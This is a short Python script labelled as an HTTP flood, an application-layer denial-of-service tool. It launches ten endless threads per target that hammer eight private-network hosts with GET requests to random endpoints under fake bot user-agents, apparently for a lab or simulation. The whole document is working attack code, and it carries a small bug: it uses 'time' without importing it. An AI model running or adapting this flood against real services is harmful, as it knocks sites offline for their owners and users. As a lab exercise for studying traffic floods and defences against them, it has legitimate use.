# """HTTP Flood - Application Layer DDoS"""
import requests
import threading
import random

targets = [f"http://10.0.1.{i}:800{i-1}" for i in range(1, 17)]

def http_flood(target):
    headers = {
        'User-Agent': f'Bot-{random.randint(1000, 9999)}',
        'Accept': '*/*'
    }
    
    while True:
        try:
            # Random endpoint
            endpoint = random.choice(['/', '/index.html', '/api', '/data'])
            response = requests.get(target + endpoint, 
                                   headers=headers, 
                                   timeout=1)
        except:
            continue

if __name__ == "__main__":
    # 10 threads per attacker
    for target in targets[:8]:
        for _ in range(10):
            t = threading.Thread(target=http_flood, args=(target,))
            t.daemon = True
            t.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[Attacker] Stopping HTTP flood")